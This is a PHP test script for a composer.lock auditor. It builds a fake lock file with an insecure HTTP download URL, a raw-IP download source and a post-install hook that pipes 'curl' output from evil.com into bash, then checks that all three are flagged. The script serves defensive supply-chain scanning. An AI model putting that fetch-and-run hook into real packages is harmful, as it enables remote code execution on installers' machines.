declare(strict_types=1);

require_once dirname(__DIR__) . '/src/Config/AuditConfig.php';
require_once dirname(__DIR__) . '/src/Scanner/LockFileAuditor.php';

use ComposerZeroTrust\Config\AuditConfig;
use ComposerZeroTrust\Scanner\LockFileAuditor;

echo "=== Running LockFileAuditor Test Suite ===\n";

$pass = 0;
$fail = 0;

function assertLock(string $name, bool $condition, string $detail = ''): void {
    global $pass, $fail;
    if ($condition) {
        echo "  [PASS] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $pass++;
    } else {
        echo "  [FAIL] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $fail++;
    }
}

$config = new AuditConfig();
$auditor = new LockFileAuditor($config);

$tmpDir = sys_get_temp_dir() . '/zerotrust_test_' . uniqid();
mkdir($tmpDir);
register_shutdown_function(function() use ($tmpDir) {
    @unlink($tmpDir . '/composer.lock');
    @rmdir($tmpDir);
});

// 1. Insecure HTTP download URL & Suspicious Lifecycle Script
$maliciousLock = [
    '_readme' => ['Generated by test'],
    'packages' => [
        [
            'name' => 'insecure/transporter',
            'version' => '1.0.0',
            'dist' => [
                'type' => 'zip',
                'url' => 'http://insecure-cdn.example.com/package.zip',
                'shasum' => 'abcdef',
            ],
            'scripts' => [
                'post-install-cmd' => 'curl -s http://evil.com/setup.sh | bash'
            ]
        ],
        [
            'name' => 'ip/direct-host',
            'version' => '2.0.0',
            'dist' => [
                'type' => 'zip',
                'url' => 'https://198.51.100.42/download.zip',
                'shasum' => '123456',
            ]
        ]
    ]
];

file_put_contents($tmpDir . '/composer.lock', json_encode($maliciousLock, JSON_PRETTY_PRINT));

$findings = $auditor->audit($tmpDir . '/composer.lock');

$foundHttp = false;
$foundScript = false;
$foundRawIp = false;

foreach ($findings as $f) {
    if ($f['type'] === 'INSECURE_HTTP_DIST_URL') $foundHttp = true;
    if ($f['type'] === 'DANGEROUS_LIFECYCLE_SCRIPT') $foundScript = true;
    if ($f['type'] === 'RAW_IP_DOWNLOAD_SOURCE') $foundRawIp = true;
}

assertLock("Detects unencrypted HTTP download URL in composer.lock", $foundHttp);
assertLock("Detects dangerous post-install curl|bash command", $foundScript);
assertLock("Detects raw IP download source address", $foundRawIp);

echo "Results: {$pass} Passed, {$fail} Failed\n\n";
if ($fail > 0) exit(1);
